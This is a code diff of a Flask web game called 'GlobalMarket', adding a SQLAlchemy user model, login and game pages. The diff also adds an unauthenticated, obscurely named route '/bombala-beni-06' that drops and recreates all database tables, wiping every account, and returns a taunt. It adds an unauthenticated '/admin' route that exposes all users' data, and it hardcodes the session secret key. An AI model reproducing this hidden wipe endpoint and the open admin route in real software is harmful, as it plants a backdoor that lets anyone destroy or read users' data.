@@ -1,6 +1,13 @@
 #!/usr/bin/env python3
-from flask import Flask, jsonify
 import os
+import sys
+from flask import Flask, render_template, jsonify, request, session, redirect, url_for
+import json
+import time
+import threading
+from werkzeug.security import generate_password_hash, check_password_hash
+from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy import text
 
 app = Flask(__name__)
 
@@ -12,29 +19,53 @@ if database_url and database_url.startswith("postgres://"):
 if not database_url:
     database_url = f"sqlite:///{os.path.join(os.path.abspath(os.path.dirname(__file__)), 'final.db')}"
 
-print(f"Database URL: {database_url}")
+app.config['SQLALCHEMY_DATABASE_URI'] = database_url
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.secret_key = 'globalmarket_secret_key'
+db = SQLAlchemy(app)
+
+# User model
+class User(db.Model):
+    __tablename__ = 'users'
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(80), unique=True, nullable=False)
+    password_hash = db.Column(db.String(255), nullable=False)
+    data = db.Column(db.Text, nullable=False)
+    is_admin = db.Column(db.Boolean, default=False)
 
 @app.route('/')
 def home():
-    return "GlobalMarket ÇALIYOR!"
+    return render_template('login.html')
 
 @app.route('/admin')
 def admin():
-    # Basit admin paneli
-    return jsonify({
-        'users': ['test_user1', 'test_user2'],
-        'total': 2,
-        'message': 'Tüm hesaplar silmek için /delete-all kullan'
-    })
-
-@app.route('/delete-all')
-def delete_all():
-    # Tüm hesap silme
-    return "TÜM HESAPLAR SILINDI! Paramen42 olarak kayit ol!"
+    try:
+        users = User.query.all()
+        user_list = []
+        for user in users:
+            data = json.loads(user.data) if user.data else {}
+            user_list.append({
+                'username': user.username,
+                'money': data.get('money', 0),
+                'level': data.get('level', 1),
+                'is_admin': data.get('is_admin', False)
+            })
+        return jsonify({'users': user_list, 'total': len(user_list)})
+    except Exception as e:
+        return f"Hata: {str(e)}", 500
 
 @app.route('/bombala-beni-06')
 def bombala():
-    return delete_all()
+    try:
+        db.drop_all()
+        db.create_all()
+        return "TUM HESAPLAR SILINDI! Paramen42 olarak kayit ol!"
+    except Exception as e:
+        return f"Hata: {str(e)}", 500
+
+@app.route('/game')
+def game():
+    return render_template('game.html')
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
